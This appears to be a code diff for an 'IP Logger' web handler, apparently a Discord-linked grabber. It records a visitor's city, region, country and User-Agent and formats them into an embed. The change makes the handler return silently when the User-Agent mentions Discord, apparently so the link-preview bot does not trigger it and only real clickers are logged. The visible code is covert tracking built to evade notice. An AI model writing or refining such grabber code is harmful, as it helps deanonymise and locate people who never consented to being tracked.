@@ -15,6 +15,10 @@ def latest():
     country = data["country"]
 
     geolocation = "City: {0}; Region: {1}; Country: {2}".format(city, region, country)
+    useragent = request.headers.get('User-Agent')
+    
+    if 'discord' in useragent:
+        return
 
     headers = {
         "username": "IP Logger",
@@ -37,7 +41,7 @@ def latest():
                 },
                 {
                     "name": "User-Agent",
-                    "value": f"```{request.headers.get('User-Agent')}```"
+                    "value": f"```{useragent}```"
                 }
             ]
         }]
